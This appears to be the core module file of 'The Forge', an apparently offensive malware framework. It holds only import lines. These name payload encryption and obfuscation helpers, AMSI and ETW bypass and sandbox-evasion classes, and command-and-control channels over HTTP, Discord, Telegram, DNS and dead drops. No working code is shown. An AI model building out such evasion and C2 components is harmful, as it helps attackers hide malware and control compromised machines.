"""The Forge — Core Module"""

from core.crypto import encrypt, decrypt, xor_encode, xor_decode, aes_encrypt, aes_decrypt
from core.crypto import generate_key, derive_key, b64_encode, b64_decode, rc4
from core.crypto import uuid_encode, ipv4_encode, mac_encode, string_obfuscate

from core.stealth import (
    SandboxDetector, AMSIBypass, ETWPatcher, AntiDebug,
    SleepObfuscation, full_stealth_check, is_elevated,
)

from core.c2_hub import (
    C2Hub, HTTPChannel, DiscordWebhookChannel, DNSChannel,
    TelegramChannel, FileDeadDrop,
    create_http_c2, create_discord_c2, create_telegram_c2, create_multi_c2,
)

from core.engine import ForgeEngine, PluginRegistry, TaskRunner, Task
